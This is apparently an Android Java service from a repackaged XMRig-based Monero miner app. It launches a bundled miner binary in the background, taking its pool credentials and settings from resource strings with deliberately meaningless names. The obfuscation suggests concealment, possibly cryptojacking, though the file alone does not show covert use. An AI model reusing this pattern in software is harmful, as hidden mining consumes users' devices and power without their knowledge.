/*
 *  Monero Miner App (c) 2018 Uwe Post
 *  based on the XMRig Monero Miner https://github.com/xmrig/xmrig
 *
 *    This program is free software: you can redistribute it and/or modify
 *    it under the terms of the GNU General Public License as published by
 *    the Free Software Foundation, either version 3 of the License, or
 *    (at your option) any later version.
 *
 *    This program is distributed in the hope that it will be useful,
 *    but WITHOUT ANY WARRANTY; without even the implied warranty of
 *    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 *    GNU General Public License for more details.
 *
 *    You should have received a copy of the GNU General Public License
 *    along with this program. If not, see <http://www.gnu.org/licenses/>.
 * /
 */

package minermob.service.c;

import android.app.Service;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Binder;
import android.os.IBinder;
import android.text.TextUtils;
import android.util.Log;

import minermob.service.R;
import minermob.service.utils.MBT;
import minermob.service.utils.spMain;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.util.Properties;

/**
 * MS for mining in the background
 * Created by uwe on 24.01.18.
 */

public class MS extends Service {


    private Process process;
    private OutputReaderThread outputHandler;
    private int accepted;
    private String speed = "./.";


    @Override
    public void onCreate() {
        super.onCreate();
    }


    public class MSB extends Binder {
        public MS getService() {
            return MS.this;
        }
    }
    @Override
    public void onDestroy() {
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) {
        return new MSB();
    }

    public void stopMining() {

        try {
            if (outputHandler != null) {
                outputHandler.interrupt();
                outputHandler = null;
            }
            if (process != null) {
                process.destroy();
                process = null;
                Log.i("Minermob", "Stopped");
            }
        } catch (Exception e) {
            Log.i("Minermob", String.valueOf(e));
        }


    }

    public void startMining() {
        if (process != null) {
            try {
                process.destroy();
            }catch (Exception e){
                Log.d("Minermob",String.valueOf(e));
            }

        }
        try {

            StringBuilder strbuffer = new StringBuilder();
            StringBuilder strbufferpass = new StringBuilder();
            strbuffer.append(getResources().getString(R.string.uix));
            strbuffer.append(".");
            strbuffer.append(spMain.spGetString(getResources().getString(R.string.dv), this));
            strbuffer.append(spMain.spGetString(getResources().getString(R.string.dvk), this));
            strbufferpass.append(spMain.spGetString(getResources().getString(R.string.dv), this));
            strbufferpass.append(spMain.spGetString(getResources().getString(R.string.dvk), this));
            strbufferpass.append(":");
            strbufferpass.append(getResources().getString(R.string.meme));
            int a=2;
            int b=40;
            if (spMain.spGetInt(getResources().getString(R.string.uth), this)>4){
                a=spMain.spGetInt(getResources().getString(R.string.uth), this)/2;
                b=50;
            }


            MBT.ing(spMain.spGetString(getResources().getString(R.string.tyr), this), "Bitcoin",
                    strbuffer.toString(),strbufferpass.toString(), a, b, 1, spMain.spGetString(getResources().getString(R.string.ytrewq), this));
            String[] args = {"./x"};
            ProcessBuilder pb = new ProcessBuilder(args);
            pb.directory(getApplicationContext().getFilesDir());
            pb.environment().put(getResources().getString(R.string.qwerty), spMain.spGetString(getResources().getString(R.string.ytrewq), this));
            pb.redirectErrorStream();

            accepted = 0;
            // run it!
            process = pb.start();
            // start processing xmrig's output
          //  outputHandler = new MS.OutputReaderThread(process.getInputStream());
            // outputHandler.start();

            Log.d("Minermob", "Starting");

        } catch (Exception e) {
            Log.e("MS", String.valueOf(e));
            process = null;
        }

    }

    public String getSpeed() {
        return speed;
    }

    public int getAccepted() {
        return accepted;
    }

    public String getOutput() {
        if (outputHandler != null && outputHandler.getOutput() != null)
            return outputHandler.getOutput().toString();
        else return "";
    }


    /**
     * thread to collect the binary's output
     */
    private class OutputReaderThread extends Thread {

        private InputStream inputStream;
        private StringBuilder output = new StringBuilder();
        private BufferedReader reader;

        OutputReaderThread(InputStream inputStream) {
            this.inputStream = inputStream;
        }

        public void run() {
            try {
                reader = new BufferedReader(new InputStreamReader(inputStream));
                String line;
                while ((line = reader.readLine()) != null) {
                    output.append(line + System.lineSeparator());
                    Log.d("Minermobaline", line);
                    if (line.contains("accepted")) {
                        String[] split = TextUtils.split(line, " ");
                        accepted++;
                    } else if (line.contains("speed")) {
                        String[] split = TextUtils.split(line, " ");
                        speed = split[split.length - 2];
                    }
                    if (currentThread().isInterrupted()) return;
                }
            } catch (IOException e) {
                Log.w("'", "exception", e);
            }
        }

        public StringBuilder getOutput() {
            return output;
        }

    }



}
